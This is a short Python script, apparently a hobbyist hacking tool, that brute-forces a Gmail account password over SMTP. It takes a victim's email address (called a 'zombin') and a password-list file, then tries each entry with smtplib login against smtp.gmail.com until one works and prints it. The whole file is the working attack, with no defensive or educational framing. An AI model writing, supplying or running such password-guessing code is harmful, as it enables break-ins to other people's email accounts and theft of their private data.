import smtplib
import socket 

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

user = input("enter the email of zombin :- ")
passwd = input("enter the passwd file name :- ")
passwd = open(passwd,"r")

for password in passwd:
    try:
        smtpserver.login(user,password)
        print("password found %s" % password)
        break
    except smtplib.SMTPAuthenticationError:
        print("password Not Found %s" % password) 
